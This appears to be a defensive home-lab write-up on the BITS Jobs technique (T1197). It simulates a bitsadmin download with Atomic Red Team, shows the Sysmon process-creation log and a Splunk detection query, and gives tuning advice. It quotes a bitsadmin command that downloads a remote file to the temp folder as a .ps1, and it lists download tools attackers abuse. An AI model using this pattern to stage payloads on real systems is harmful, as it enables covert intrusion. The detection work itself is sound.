# T1197 — BITS Jobs

**Tactic:** Defense Evasion / Persistence  **Technique:** T1197  **Log Source:** Sysmon (XmlWinEventLog) — Process Creation

## What This Attack Does

Windows Background Intelligent Transfer Service (BITS) is a legitimate mechanism
normally used by the OS and applications to download files in the background.
Attackers abuse it to download or upload malicious files while blending in with
normal system traffic — BITS transfers are trusted, survive reboots, and are
often overlooked by defenders and network monitoring. It's a living-off-the-land
technique that doubles as both a download method and a persistence mechanism.

## How I Simulated It

Tool: Atomic Red Team
Command executed on the Windows 11 target (192.168.56.102):

    Invoke-AtomicTest T1197 -TestNumbers 1

Test #1 ("Bitsadmin Download — cmd") uses `bitsadmin.exe` to attempt downloading a
file from a remote GitHub URL via a BITS transfer job.

Note: the transfer timed out and was canceled after 120 seconds because the
Windows host has no internet access. The attack attempt was still fully generated
and logged before failing at the network layer — the same outcome a real attacker
sees when a BITS transfer is blocked by an outbound firewall or proxy.

## What Splunk Captured

Sysmon Event ID 1 (Process Creation) fired 3 times, capturing the full chain
`powershell.exe` → `cmd.exe` → `bitsadmin.exe`:
- User: `WINDOWS\khaled`
- Parent CommandLine: `cmd.exe /c bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\bitsadmin1_flag.ps1`
- Child: `bitsadmin.exe /transfer /Download /priority Foreground <URL> C:\Users\khaled\AppData\Local\Temp\bitsadmin1_flag.ps1`
- A second `bitsadmin.exe` process entry completes the chain

## SPL Detection Query

```spl
index=* sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational" "bitsadmin"
| rex field=_raw "Name='Image'>(?P<Image>[^<]+)"
| rex field=_raw "Name='CommandLine'>(?P<CommandLine>[^<]+)"
| rex field=_raw "Name='ParentImage'>(?P<ParentImage>[^<]+)"
| rex field=_raw "Name='User'>(?P<User>[^<]+)"
| rex field=_raw "Name='UtcTime'>(?P<UtcTime>[^<]+)"
| table UtcTime, User, Image, CommandLine, ParentImage
```

## Detection Logic

The query keys on `bitsadmin`, and the high-value signal is `bitsadmin.exe
/transfer` with a `/Download` and an `http(s)` URL — BITS being used to pull a
file, not for a legitimate update. Two details raise confidence here: the
destination is a `.ps1` dropped into `%temp%` (a script payload staged in a temp
directory), and the parent chain is `powershell.exe` → `cmd.exe`, i.e. scripted
rather than an OS update service. Because it's captured at process creation, the
full source URL and output path are preserved even though the transfer failed.

## False Positives / Tuning

Windows Update and some installers use BITS, but they don't typically call
`bitsadmin.exe` interactively from a shell — legitimate BITS activity usually goes
through the service or PowerShell's `Start-BitsTransfer` under trusted parents.
Tune by flagging `bitsadmin /transfer` from a script host, downloads of
executable/script types (`.ps1`, `.exe`, `.dll`, `.bat`), destinations in temp or
user directories, and non-corporate source URLs (raw GitHub, pastebin, raw IPs).
This pairs naturally with the T1105 `certutil` detection — both are LOLBin
download methods, and covering the whole family (`bitsadmin`, `certutil`,
`curl.exe`, `Invoke-WebRequest`) closes off the common ingress paths.

## Result

Splunk detected the BITS transfer attempt across 3 process-creation events,
capturing the full chain and the exact download URL and destination path. The
transfer failed due to no internet access, but the attempt was fully visible in
process-creation logs — proof that even a failed or blocked BITS job leaves a
clear forensic trail.

## Screenshots

**Attack executed on Windows 11 target (bitsadmin transfer times out — no internet):**
<img width="865" alt="T1197 bitsadmin BITS job on Windows 11" src="https://github.com/user-attachments/assets/e86e1378-929f-4449-9629-5ae7404314da" />

**Detection in Splunk — 3 events, full powershell → cmd → bitsadmin chain:**
<img width="1906" alt="T1197 detection in Splunk showing bitsadmin transfer job" src="https://github.com/user-attachments/assets/0280af32-7d69-407a-a8ef-6a6f3f64ca63" />
